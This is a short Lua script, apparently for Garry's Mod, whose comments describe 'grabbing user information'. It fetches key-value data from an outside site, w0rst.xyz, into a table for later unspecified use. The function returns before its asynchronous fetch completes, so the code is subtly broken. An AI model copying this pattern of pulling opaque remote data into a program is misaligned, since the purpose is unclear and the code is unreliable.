-- [ This is for grabbing user information ] --
-- [ This will be helpful for assinging values ] --

--[[
    quick little explanation on how this actually works
    we fetch the share url with a user identifier for handling
    then with that info we split it into readable forms for lua
    then we can do whatever we want with that info later
]]

local function GatherData()
    local storage = {}
    http.Fetch("https://w0rst.xyz/special/share.php", function(b)
        for line in string.gmatch(b, '[^\n]+') do 
            local value = string.Split(line, "=")
            storage[value[1]] = value[2]
        end
    end, function(m) print(m) end)
    return storage
end

local Info = GatherData()

